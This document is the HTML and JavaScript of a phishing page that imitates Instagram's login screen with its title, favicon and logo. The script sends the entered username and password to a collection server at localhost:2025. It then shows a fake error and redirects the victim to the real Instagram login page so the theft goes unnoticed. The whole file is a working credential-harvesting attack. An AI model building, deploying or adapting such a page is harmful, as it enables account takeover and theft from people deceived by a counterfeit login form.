<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" />
</head>
<script>
  async function handleLogin() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    if (!username || !password) {
      alert("Please fill in both fields.");
      return;
    }

    try {
      const response = await fetch("http://localhost:2025/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
      });

      const data = await response.json();
      if (response.ok) {
        alert("Something went wrong. Please log in again.");
        window.location.href = "https://www.instagram.com/accounts/login/";
      } else {
        alert(data.message || "Login failed.");
      }
    } catch (err) {
      console.error("Error:", err);
      alert("Server error. Please try again later.");
    }
  }
</script>

<body>
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram" class="logo" />
      <input type="text" id="username" placeholder="Phone number, username, or email" />
      <input type="password" id="password" placeholder="Password" />
     <button class="login-btn" onclick="handleLogin()">Log in</button>


      <div class="divider">
        <div class="line"></div>
        <div class="or">OR</div>
        <div class="line"></div>
      </div>

      <a href="#" class="fb-login">
        <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="fb" /> Log in with Facebook
      </a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    
  </div>
